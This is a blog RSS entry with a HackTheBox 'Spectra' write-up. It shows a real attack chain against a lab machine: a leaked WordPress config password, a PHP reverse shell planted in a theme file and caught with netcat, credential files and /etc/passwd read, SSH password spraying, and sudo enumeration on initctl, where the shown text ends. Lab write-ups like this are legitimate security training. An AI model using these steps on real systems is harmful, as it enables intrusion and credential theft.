<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>initctl on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/initctl/</link>
    <description>Recent content in initctl on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 26 Jun 2021 21:27:14 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/initctl/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Spectra</title>
      <link>https://fahmifj.github.io/hackthebox/spectra/</link>
      <pubDate>Sat, 26 Jun 2021 21:27:14 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/spectra/</guid>
      <description>Getting password from automatic login script of ChromeOS</description>
      <content:encoded><![CDATA[<p>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a WordPress website, which has a directory listing enabled, thus exposing its source code. Examining the source reveals a database password that is reused by the wordpress admin. With administrator access, I&rsquo;m able to inject a PHP code into a theme file to get a foothold on the system. Enumerating the internal discovers an auto-login password, and it is reused by a user. The user has sudo permissions on <code>initctl</code>, which can be exploited to get a root shell.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>WordPress exploitation</li>
<li>Command injection</li>
<li>Sudo exploitation on initctl</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> full scan discovers three open ports: SSH on port 22, Nginx web server in port 80, and MySQL.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ nmap -p- -sV --reason -oA nmap/10-allport 10.10.10.229
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-15 10:10 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.229
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.052s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65532</span> resets
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON         VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open  http    syn-ack ttl <span class="m">63</span> nginx 1.17.4
</span></span><span class="line"><span class="cl">3306/tcp open  mysql   syn-ack ttl <span class="m">63</span> MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 123.14 seconds
</span></span></code></pre></div><p>MySQL service is normally tied to 127.0.0.1, but <code>nmap</code> already identified that I have no access there.</p>
<p>Running a script scan didn&rsquo;t find any interesting information.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---spectrahtb">TCP 80 - spectra.htb</h3>
<p>The site appears to be under development.</p>
<p><div class="img-container"><img src="imgs/image-20210515212024368.png" alt="image-20210515212024368"  /></div>
</p>
<p>Inspecting page source discovers a hostname and two directories:</p>
<ul>
<li><a href="http://spectra.htb/main/index.php">http://spectra.htb/main/index.php</a></li>
<li><a href="http://spectra.htb/testing/index.php">http://spectra.htb/testing/index.php</a></li>
</ul>
<p><div class="img-container"><img src="imgs/image-20210515212038877.png" alt="image-20210515212038877"  /></div>
</p>
<p>I&rsquo;ll update my <code>/etc/hosts</code> with the hostname.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.229 spectra.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>Poking with <code>curl</code>, shows that with or without the hostname it&rsquo;s the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">→ root@kali «~» «10.10.14.9» 
</span></span><span class="line"><span class="cl">$ curl -s http://spectra.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">283</span>
</span></span><span class="line"><span class="cl">→ root@kali «~» «10.10.14.9» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.229 <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">283</span>
</span></span></code></pre></div><p>Clicking on &ldquo;<strong>Software Issue Tracker</strong>&rdquo;, redirects to a WordPress site and nothing interesting except one default post by administrator.</p>
<p><div class="img-container"><img src="imgs/image-20210626224157109.png" alt="image-20210626224157109"  /></div>
</p>
<p>Visiting &ldquo;<strong>Test</strong>&rdquo;, the site page shows an error message about database connection.</p>
<p><div class="img-container"><img src="imgs/image-20210515214125642.png" alt="image-20210515214125642"  /></div>
</p>
<p>Removing <code>index.php</code> from URL, reveals that this page has directory listing enabled.</p>
<p><div class="img-container"><img src="imgs/image-20210515221118144.png" alt="image-20210515221118144"  /></div>
</p>
<p>The  <code>wp-config.php.save</code> file draws my attention. It contains a set of database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ curl http://spectra.htb/testing/wp-config.php.save
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;dev&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/** MySQL database username */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;devtest&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/** MySQL database password */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;devteam01&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/** MySQL hostname */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_HOST&#39;</span>, <span class="s1">&#39;localhost&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-nginx">Shell as nginx</h3>
<h4 id="wp-admin-dashboard">WP-Admin Dashboard</h4>
<p>The database password works with administrator account (<code>administrator:devteam01</code>), it allows me to access the admin dashboard.</p>
<p><div class="img-container"><img src="imgs/image-20210626225944808.png" alt="image-20210626225944808"  /></div>
</p>
<h4 id="injecting-reverse-shell">Injecting Reverse Shell</h4>
<p>Armed with administrator access, I can inject a malicious PHP code into one of the available themes files and execute it by visiting the full URL of the theme file. In this case, I&rsquo;ll inject a <a href="https://github.com/pentestmonkey/php-reverse-shell">reverse shell</a> script in <code>404.php</code> file of the Twenty Nineteen theme. The file can be found at <strong>Appearance</strong> &gt; <strong>Theme Editor</strong>.</p>
<p><div class="img-container"><img src="imgs/image-20210515231108016.png" alt="image-20210515231108016"  /></div>
</p>
<p>I&rsquo;ll access this URL to get a shell: <code>http://spectra.htb/main/wp-content/themes/twentynineteen/404.php</code>, but it returns an error message pointing on line 12.</p>
<p><div class="img-container"><img src="imgs/image-20210515231346411.png" alt="image-20210515231346411"  /></div>
</p>
<p>I&rsquo;m able to resolve the error by commenting out the line 12.</p>
<p><div class="img-container"><img src="imgs/image-20210515231422348.png" alt="image-20210515231422348"  /></div>
</p>
<p>This time, I&rsquo;ll trigger the reverse shell using <code>curl</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ curl -s http://spectra.htb/main/wp-content/themes/twentynineteen/404.php
</span></span></code></pre></div><p>On my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.21<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.229<span class="o">]</span> <span class="m">35166</span>
</span></span><span class="line"><span class="cl">Linux spectra 5.4.66+ <span class="c1">#1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7302P 16-Core Processor AuthenticAMD GNU/Linux</span>
</span></span><span class="line"><span class="cl"> 09:14:42 up 10:53,  <span class="m">0</span> users,  load average: 0.02, 0.04, 0.00
</span></span><span class="line"><span class="cl">USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>20155<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ hostname
</span></span><span class="line"><span class="cl">spectra
</span></span></code></pre></div><h4 id="shell-upgrade">Shell upgrade</h4>
<p>My current shell doesn&rsquo;t have PATH variable set, so I have to use the full path to upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ which python3
</span></span><span class="line"><span class="cl">which: no python3 in <span class="o">((</span>null<span class="o">))</span>
</span></span><span class="line"><span class="cl">$ ls /usr/bin/ <span class="p">|</span> grep python 
</span></span><span class="line"><span class="cl">python
</span></span><span class="line"><span class="cl">python-config
</span></span><span class="line"><span class="cl">python-wrapper
</span></span><span class="line"><span class="cl">python2
</span></span><span class="line"><span class="cl">python2.7
</span></span><span class="line"><span class="cl">python3
</span></span><span class="line"><span class="cl">python3.6
</span></span><span class="line"><span class="cl">python3.6m
</span></span><span class="line"><span class="cl">$ /usr/bin/python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">nginx@spectra / $ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">nginx@spectra / $ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7285</span> suspended  nc -nvlp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7285</span> continued  nc -nvlp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">nginx@spectra / $ 
</span></span></code></pre></div><p>To resolve the <code>((null))</code> message, I&rsquo;ll add <code>/usr/bin</code> to current PATH variable.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nginx@spectra / $ env
</span></span><span class="line"><span class="cl"><span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nv">USER</span><span class="o">=</span>nginx
</span></span><span class="line"><span class="cl"><span class="nv">PWD</span><span class="o">=</span>/
</span></span><span class="line"><span class="cl"><span class="nv">SHLVL</span><span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="nv">HOME</span><span class="o">=</span>/home/nginx
</span></span><span class="line"><span class="cl"><span class="nv">_</span><span class="o">=</span>/usr/bin/env
</span></span><span class="line"><span class="cl">nginx@spectra / $ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/usr/bin 
</span></span><span class="line"><span class="cl">nginx@spectra / $ which python
</span></span><span class="line"><span class="cl">/usr/local/bin/python
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-katie">Shell as katie</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>There are 4 users with login shell in this machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nginx@spectra / $ cat /etc/passwd <span class="p">|</span> grep sh$  
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
</span></span><span class="line"><span class="cl">nginx:x:20155:20156::/home/nginx:/bin/bash
</span></span><span class="line"><span class="cl">katie:x:20156:20157::/home/katie:/bin/bash
</span></span></code></pre></div><p>Enumerating home directory shows the user flag is on  <code>katie</code>&rsquo;s home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nginx@spectra / $ ls -lR /home 2&gt;/dev/null
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">/home/katie:
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> katie katie <span class="m">4096</span> Jan <span class="m">15</span> 15:55 log
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> katie katie   <span class="m">33</span> Feb  <span class="m">2</span> 15:57 user.txt
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>All the web files are located in <code>/usr/local/share/nginx/html/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nginx@spectra / $ find / -type f -name wp-config.php 2&gt;/dev/null
</span></span><span class="line"><span class="cl">/usr/local/share/nginx/html/main/wp-config.php
</span></span><span class="line"><span class="cl">/usr/local/share/nginx/html/testing/wp-config.php
</span></span><span class="line"><span class="cl">/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php
</span></span><span class="line"><span class="cl">/mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-config.php
</span></span></code></pre></div><p>The <code>wp-config.php</code> file for <code>/main</code> has different credentials with the one on <code>/testing</code>. I&rsquo;ll grab these credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nginx@spectra / $ cat /usr/local/share/nginx/html/main/wp-config.php
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">// ** MySQL settings - You can get this info from your web host ** //
</span></span><span class="line"><span class="cl">/** The name of the database <span class="k">for</span> WordPress */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;dev&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/** MySQL database username */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;dev&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/** MySQL database password */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;development01&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>In <code>/opt</code>, there is a file with uncommon extension called <code>autologin.conf.orig</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nginx@spectra /opt $ cat autologin.conf.orig 
</span></span><span class="line"><span class="cl"><span class="c1"># Copyright 2016 The Chromium OS Authors. All rights reserved.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Use of this source code is governed by a BSD-style license that can be</span>
</span></span><span class="line"><span class="cl"><span class="c1"># found in the LICENSE file.</span>
</span></span><span class="line"><span class="cl">description   <span class="s2">&#34;Automatic login at boot&#34;</span>
</span></span><span class="line"><span class="cl">author        <span class="s2">&#34;chromium-os-dev@chromium.org&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># After boot-complete starts, the login prompt is visible and is accepting</span>
</span></span><span class="line"><span class="cl"><span class="c1"># input.</span>
</span></span><span class="line"><span class="cl">start on started boot-complete
</span></span><span class="line"><span class="cl">script
</span></span><span class="line"><span class="cl">  <span class="nv">passwd</span><span class="o">=</span>
</span></span><span class="line"><span class="cl">  <span class="c1"># Read password from file. The file may optionally end with a newline.</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> dir in /mnt/stateful_partition/etc/autologin /etc/autologin<span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">dir</span><span class="si">}</span><span class="s2">/passwd&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">      <span class="nv">passwd</span><span class="o">=</span><span class="s2">&#34;</span><span class="k">$(</span>cat <span class="s2">&#34;</span><span class="si">${</span><span class="nv">dir</span><span class="si">}</span><span class="s2">/passwd&#34;</span><span class="k">)</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="nb">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl">  <span class="k">done</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="si">${</span><span class="nv">passwd</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">  <span class="k">fi</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>Based on the comments, the file is an autologin script. It looks for <code>passwd</code> file in these directories:</p>
<ul>
<li><code>/mnt/stateful_partition/etc/autologin</code></li>
<li><code>/etc/autologin</code></li>
</ul>
<p>And the <code>passwd</code> file in <code>/etc/autologin/</code> directory contains a password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nginx@spectra /opt $ ls -l /etc/autologin/             
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">19</span> Feb  <span class="m">3</span> 16:43 passwd
</span></span><span class="line"><span class="cl">nginx@spectra /opt $ cat /etc/autologin/passwd 
</span></span><span class="line"><span class="cl">SummerHereWeCome!!
</span></span></code></pre></div><h4 id="ssh---katie">SSH - katie</h4>
<p>I&rsquo;ll spray <code>SummerHereWeCome!!</code> and <code>development01</code> using <code>crackmapexec</code> to the users who have login shell. Within a few sec, it returns that <code>katie:SummerHereWeCome!!</code> are the valid credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ crackmapexec ssh 10.10.10.229 -u users.list -p passwords.list
</span></span><span class="line"><span class="cl">SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_8.1
</span></span><span class="line"><span class="cl">SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> chronos:devteam01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> chronos:development01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> chronos:SummerHereWeCome!! Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> katie:devteam01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>-<span class="o">]</span> katie:development01 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.229    <span class="m">22</span>     10.10.10.229     <span class="o">[</span>+<span class="o">]</span> katie:SummerHereWeCome!!
</span></span></code></pre></div><p>I&rsquo;m able to login via SSH</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «spectra» «10.10.14.21» 
</span></span><span class="line"><span class="cl">$ ssh katie@10.10.10.229
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl">katie@spectra ~ $ id 
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>20156<span class="o">(</span>katie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span>,20158<span class="o">(</span>developers<span class="o">)</span>
</span></span></code></pre></div><p>User flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">katie@spectra ~ $ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">36</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">5</span> katie katie <span class="m">4096</span> May <span class="m">15</span> 12:17 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">8</span> root  root  <span class="m">4096</span> Feb  <span class="m">2</span> 15:55 ..
</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root  root     <span class="m">9</span> Feb  <span class="m">2</span> 15:55 .bash_history -&gt; /dev/null
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> katie katie  <span class="m">127</span> Dec <span class="m">22</span> 05:46 .bash_logout
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> katie katie  <span class="m">204</span> Dec <span class="m">22</span> 05:46 .bash_profile
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> katie katie  <span class="m">551</span> Dec <span class="m">22</span> 05:46 .bashrc
</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> katie katie <span class="m">4096</span> May <span class="m">15</span> 12:17 .gnupg
</span></span><span class="line"><span class="cl">drwx------ <span class="m">3</span> katie katie <span class="m">4096</span> Jan <span class="m">15</span> 15:55 .pki
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> katie katie <span class="m">4096</span> Jan <span class="m">15</span> 15:55 log
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> katie katie   <span class="m">33</span> Feb  <span class="m">2</span> 15:57 user.txt
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration-1">Internal Enumeration</h4>
<p>The first thing I will check if I have the user&rsquo;s password is the sudo rights, and this user has one on <a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it"><code>initctl</code></a>. Unfortunately, <code>initctl</code> is not listed on GTFObins site, so I&rsquo;ll have to look around.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">katie@spectra ~ $ sudo -l
</span></span><span class="line"><span class="cl">User katie may run the following commands on spectra:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> SETENV: NOPASSWD: /sbin/initctl
</span></span></code></pre></div><p>Enumerating for files owned by developers discovers some writable <code>.conf</code> files and a JavaScript file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">katie@spectra ~ $ find / -type f -group developers -ls 2&gt;/dev/null
</span></span><span class="line"><span class="cl">    <span class="m">32121</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test6.conf
</span></span><span class="line"><span class="cl">    <span class="m">32123</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test7.conf
</span></span><span class="line"><span class="cl">    <span class="m">32109</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test3.conf
</span></span><span class="line"><span class="cl">    <span class="m">32112</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test4.conf
</span></span><span class="line"><span class="cl">    <span class="m">32103</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test.conf
</span></span><span class="line"><span class="cl">    <span class="m">32126</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test8.conf
</span></span><span class="line"><span class="cl">    <span class="m">32128</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test9.conf
</span></span><span class="line"><span class="cl">    <span class="m">32106</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test10.conf
</span></span><span class="line"><span class="cl">    <span class="m">32108</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test2.conf
</span></span><span class="line"><span class="cl">    <span class="m">32120</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test5.conf
</span></span><span class="line"><span class="cl">    <span class="m">32105</span>      <span class="m">4</span> -rw-rw----   <span class="m">1</span> root     developers      <span class="m">478</span> Jun <span class="m">29</span>  <span class="m">2020</span> /etc/init/test1.conf
</span></span><span class="line"><span class="cl">    <span class="m">23763</span>      <span class="m">4</span> -rwxrwxr-x   <span class="m">1</span> root     developers      <span class="m">251</span> Jun <span class="m">29</span>  <span class="m">2020</span> /srv/nodetest.js
</span></span></code></pre></div><p>These <code>.conf</code> files are configuration scripts to start <code>/srv/nodetest.js</code>.  The JS file itself is not that important here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">katie@spectra ~ $ cat /etc/init/test.conf 
</span></span><span class="line"><span class="cl">description <span class="s2">&#34;Test node.js server&#34;</span>
</span></span><span class="line"><span class="cl">author      <span class="s2">&#34;katie&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">start on filesystem or runlevel <span class="o">[</span>2345<span class="o">]</span>
</span></span><span class="line"><span class="cl">stop on shutdown
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">script
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">export</span> <span class="nv">HOME</span><span class="o">=</span><span class="s2">&#34;/srv&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="nv">$$</span> &gt; /var/run/nodetest.pid
</span></span><span class="line"><span class="cl">    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">end script
